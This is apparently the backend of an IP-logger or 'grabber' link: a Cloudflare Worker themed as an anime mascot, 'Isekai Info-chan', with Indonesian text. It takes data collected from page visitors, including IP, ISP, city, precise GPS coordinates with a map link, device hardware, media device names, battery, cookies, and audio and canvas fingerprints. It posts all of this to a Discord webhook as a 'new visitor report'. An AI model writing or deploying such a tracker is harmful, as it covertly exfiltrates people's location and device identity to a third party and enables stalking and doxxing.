/**
 * Cloudflare Worker — Isekai Info-chan ✨
 */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

const AVATAR = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif";

function s(v, max = 200) {
  if (v == null || v === "" || v === "null" || v === undefined) return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function bool(v) {
  if (v === true || v === "true") return "✅";
  if (v === false || v === "false") return "❌";
  return "—";
}

function arr(v) {
  if (!v || !Array.isArray(v) || v.length === 0) return "—";
  return v.join(", ").slice(0, 200) || "—";
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  } catch (_) { return new Date().toISOString(); }
}

function parseBrands(brandsJson) {
  try {
    const arr = JSON.parse(brandsJson);
    return arr.map(b => `${b.brand} ${b.version}`).join(", ");
  } catch (_) { return s(brandsJson); }
}

// Spacer field untuk jeda antar section
const SPACER = { name: "\u200B", value: "\u200B", inline: false };

function buildEmbed(data) {
  const gpsValue = (data.lat && data.lon)
    ? `[🗺️ Buka Google Maps](https://maps.google.com/?q=${data.lat},${data.lon})\n\`Lat: ${data.lat}\`  •  \`Lon: ${data.lon}\``
    : "*uwu~ lokasi GPS tidak ketemu nyaa~ (◡︿◡✿)*";

  const urlValue = data.url
    ? `[🔗 Klik untuk buka](${data.url})\n\`${s(data.url, 180)}\``
    : "—";

  const referrerValue = data.referrer
    ? `[🌸 Lihat halaman asal](${data.referrer})\n\`${s(data.referrer, 180)}\``
    : "*langsung dibuka nyaa~ (ﾉ◕ヮ◕)ﾉ*";

  const fields = [
    // ── Link Section ──
    {
      name: "🔗  ✨ Link Yang Dibuka",
      value: urlValue,
      inline: false
    },
    {
      name: "🌸  Datang Dari",
      value: referrerValue,
      inline: false
    },

    SPACER,

    // ── IP & Location ──
    {
      name: "🌐  IP & Lokasi",
      value: [
        `📍 **IP:** \`${s(data.ip)}\``,
        `🏢 **ISP:** ${s(data.isp)}`,
        `🏙️ **Kota:** ${s(data.city)}`,
        `🗾 **Region:** ${s(data.region)}`,
        `🌍 **Negara:** ${s(data.country)}`,
        `🕵️ **Proxy:** ${bool(data.proxy)}  •  ☁️ **Hosting:** ${bool(data.hosting)}`,
        `📡 **ASN:** ${s(data.asn)}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "📡  GPS Koordinat",
      value: gpsValue,
      inline: false
    },

    SPACER,

    // ── Device ──
    {
      name: "💻  Hardware",
      value: [
        `⚙️ **CPU:** \`${s(data.hardwareConcurrency)} cores\``,
        `🧠 **RAM:** \`${s(data.deviceMemory)} GB\``,
        `🎮 **GPU:** ${s(data.vendor)} — ${s(data.renderer)}`,
        `🔷 **WebGL:** ${s(data.version)}  •  🚀 **WebGPU:** ${bool(data.webgpu)}`,
        `👆 **Touch Points:** ${s(data.maxTouchPoints)}`,
        `📳 **Sensor:** Accel:${s(data.accel)}  Gyro:${s(data.gyro)}  Mag:${s(data.mag)}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "🖥️  Layar",
      value: [
        `📐 **Resolusi:** \`${s(data.width)}x${s(data.height)}\`  •  Avail: \`${s(data.availWidth)}x${s(data.availHeight)}\``,
        `🔍 **Pixel Ratio:** \`${s(data.pixelRatio)}\`  •  🎨 **Color Depth:** \`${s(data.colorDepth)} bit\``,
        `🔄 **Orientasi:** ${s(data.orientation)} (${s(data.orientationAngle)}°)`,
        `🪟 **Inner:** \`${s(data.innerWidth)}x${s(data.innerHeight)}\``,
      ].join("\n"),
      inline: false
    },

    SPACER,

    // ── OS & Platform ──
    {
      name: "📱  Platform & OS",
      value: [
        `🖥️ **Platform:** ${s(data.platform)}  •  📲 **Mobile:** ${bool(data.mobile)}`,
        `📋 **Model:** ${s(data.model)}`,
        `⚙️ **Arch:** ${s(data.architecture)}  •  🔢 **Bitness:** ${s(data.bitness)}`,
        `🏷️ **UA Brands:** ${data.brands ? parseBrands(data.brands) : "—"}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "🌍  Locale",
      value: [
        `🗣️ **Bahasa:** ${s(data.language)}  •  📚 **Languages:** ${s(data.languages)}`,
        `⏰ **Timezone:** ${s(data.timezone)}`,
        `💴 **Currency:** ${s(data.currency)}  •  📅 **Calendar:** ${s(data.calendar)}`,
        `🔢 **Numbering:** ${s(data.numberingSystem)}`,
      ].join("\n"),
      inline: false
    },

    SPACER,

    // ── Network & Battery ──
    {
      name: "🌐  Jaringan",
      value: [
        `📶 **Tipe:** ${s(data.connectionType)}  •  🚀 **Effective:** ${s(data.effectiveConnection)}`,
        `⬇️ **Downlink:** ${s(data.downlink)} Mbps  •  ⏱️ **RTT:** ${s(data.rtt)} ms`,
        `💡 **Save Data:** ${bool(data.saveData)}  •  🌍 **Online:** ${bool(data.online)}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "🔋  Baterai & Audio",
      value: [
        `⚡ **Level:** ${s(data.level)}  •  🔌 **Charging:** ${bool(data.charging)}`,
        `🎵 **Audio FP:** \`${s(data.audioFingerprint, 70)}\``,
        `🎨 **Canvas FP:** \`${s(data.canvasFingerprint, 60)}\``,
      ].join("\n"),
      inline: false
    },

    SPACER,

    // ── Storage & Media ──
    {
      name: "💾  Storage",
      value: [
        `📦 **LocalStorage:** ${bool(data.localStorage)}  •  📂 **SessionStorage:** ${bool(data.sessionStorage)}`,
        `🗄️ **IndexedDB:** ${bool(data.indexedDB)}  •  👷 **ServiceWorker:** ${bool(data.serviceWorker)}`,
        `⚡ **Cache API:** ${bool(data.cacheAPI)}  •  🍪 **Cookies:** ${s(data.cookies)}`,
        `🚫 **DNT:** ${s(data.doNotTrack)}  •  ✅ **Cookie Enabled:** ${bool(data.cookieEnabled)}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "🎥  Media Devices",
      value: [
        `🎤 **Audio In:** ${arr(data.audioIn)}`,
        `📷 **Video In:** ${arr(data.videoIn)}`,
        `🔈 **Audio Out:** ${arr(data.audioOut)}`,
      ].join("\n"),
      inline: false
    },

    SPACER,

    // ── Browser ──
    {
      name: "🧩  Fitur Browser",
      value: [
        `🔷 WebGL2: ${bool(data.webgl2)}  •  🚀 WebGPU: ${bool(data.webgpu)}  •  📹 WebRTC: ${bool(data.webrtc)}`,
        `📊 CSS Grid: ${bool(data.cssGrid)}  •  📐 Flexbox: ${bool(data.flexbox)}`,
        `📡 Fetch API: ${bool(data.fetchAPI)}  •  🤝 Promise: ${bool(data.promise)}`,
        `🧩 **Plugins:** ${s(data.plugins) || "—"}`,
      ].join("\n"),
      inline: false
    },
    {
      name: "📜  User Agent",
      value: `\`\`\`${s(data.userAgent, 200)}\`\`\``,
      inline: false
    },
  ];

  return {
    color: 0xFF85C1,
    author: {
      name: "✨ Isekai Info-chan melaporkan~ (｡♥‿♥｡)",
      icon_url: AVATAR,
    },
    thumbnail: { url: AVATAR },
    title: "🌸 Laporan Pengunjung Baru Nyaa~ 🌸",
    description: `> *Ara ara~ ada tamu baru masuk ke dunia isekai!\n> Info-chan sudah mengumpulkan semua datanya desu~ (≧◡≦) ✨*`,
    fields,
    footer: {
      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
    },
    timestamp: new Date().toISOString()
  };
}

function buildGpsEmbed(data) {
  const mapsUrl = `https://maps.google.com/?q=${data.lat},${data.lon}`;
  return {
    color: 0xFF85C1,
    author: {
      name: "📍 Isekai Info-chan — Update Lokasi GPS~ (｡♥‿♥｡)",
      icon_url: AVATAR,
    },
    thumbnail: { url: AVATAR },
    title: "🗺️ Koordinat GPS Berhasil Didapat Nyaa~ 🌸",
    description: `> *Ara ara~ tamu-chan mengizinkan akses lokasi desu~\n> Info-chan berhasil mengunci koordinatnya! (≧◡≦) ✨*`,
    fields: [
      {
        name: "📍  Koordinat",
        value: [
          `**Latitude:** \`${data.lat}\``,
          `**Longitude:** \`${data.lon}\``,
          `**Akurasi:** ±\`${data.accuracy ? Math.round(data.accuracy) + " meter" : "—"}\``,
          `[🗺️ Buka Google Maps](${mapsUrl})`,
        ].join("\n"),
        inline: false
      },
      {
        name: "🔗  URL Halaman",
        value: data.url ? `\`${s(data.url, 200)}\`` : "—",
        inline: false
      },
    ],
    footer: {
      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
    },
    timestamp: new Date().toISOString()
  };
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
    if (request.method !== "POST") return new Response("Not Found", { status: 404, headers: CORS });

    let data;
    try { data = await request.json(); } catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }

    const webhook = env.DISCORD_WEBHOOK_URL;
    if (!webhook) return new Response("OK", { status: 200, headers: CORS });

    // GPS-only follow-up → kirim embed kecil khusus koordinat
    const embed = data._gpsOnly ? buildGpsEmbed(data) : buildEmbed(data);

    try {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "Isekai Info-chan ✨",
          avatar_url: AVATAR,
          embeds: [embed]
        })
      });
    } catch (e) { console.error(e); }

    return new Response("OK", { status: 200, headers: CORS });
  },
};
